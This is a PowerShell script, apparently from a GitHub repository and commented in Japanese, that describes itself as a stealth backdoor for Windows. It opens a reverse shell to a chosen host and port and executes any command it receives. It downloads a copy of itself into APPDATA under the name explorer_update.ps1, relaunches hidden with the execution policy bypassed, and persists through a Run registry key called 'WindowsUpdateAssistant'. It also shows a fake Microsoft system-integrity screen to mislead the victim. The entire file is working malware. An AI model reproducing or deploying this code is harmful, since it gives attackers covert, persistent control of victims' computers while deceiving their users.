# --- RP2040 Stealth Backdoor (Robust Background Version) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

param(
    [string]$LHOST = "192.168.0.248",
    [int]$LPORT = 4444,
    [switch]$Background
)

function Start-ReverseShell {
    param(
        [string]$LHOST,
        [int]$LPORT,
        [switch]$Background
    )

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    # --- 1. バックグラウンドモード (本体) ---
    if ($Background) {
        while ($true) {
            try {
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)

                $Writer.WriteLine("--- RP2040 Session: $($env:COMPUTERNAME) @ $(Get-Date) ---")
                $Writer.Write("PS " + (Get-Location).Path + "> ")

                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        try {
                            $Result = Invoke-Expression $Command 2>&1 | Out-String
                        } catch {
                            $Result = $_.Exception.Message
                        }
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
                $TCPClient.Close()
            } catch {
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # --- 2. デコイモード (可視ターミナル) ---
    
    # 永続化保存
    if (-not (Test-Path $DestPath)) {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
    }

    # バックグラウンド起動
    # 引数 -Background を付けて自分自身をもう一度起動する
    $LaunchCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background"
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        $WshShell.Run($LaunchCommand, 0, $false)
    } catch {
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background" -WindowStyle Hidden
    }

    # 永続化レジストリ登録
    $RegCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background`""
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand

    # おとり画面
    Clear-Host
    Write-Host "Microsoft Windows [Version 10.0.19045.4170]"
    Write-Host "(c) Microsoft Corporation. All rights reserved."
    Write-Host ""
    Write-Host "System Optimization in progress..." -ForegroundColor Cyan
    Start-Sleep -Seconds 1
    
    $steps = @(10, 25, 48, 62, 85, 99, 100)
    foreach ($s in $steps) {
        Write-Host "`rChecking system integrity: $s%" -NoNewline
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    }
    Write-Host "`rSystem Integrity: OK. Monitoring security state..." -ForegroundColor Green
    Write-Host "Please do not close this window for a few minutes."
    
    while($true) { Start-Sleep -Seconds 60 }
}

# --- 3. 実行エントリーポイント ---
# スクリプトが読み込まれた時に、引数があれば即実行する
if ($MyInvocation.InvocationName -ne 'Start-ReverseShell') {
    Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background:$Background
}
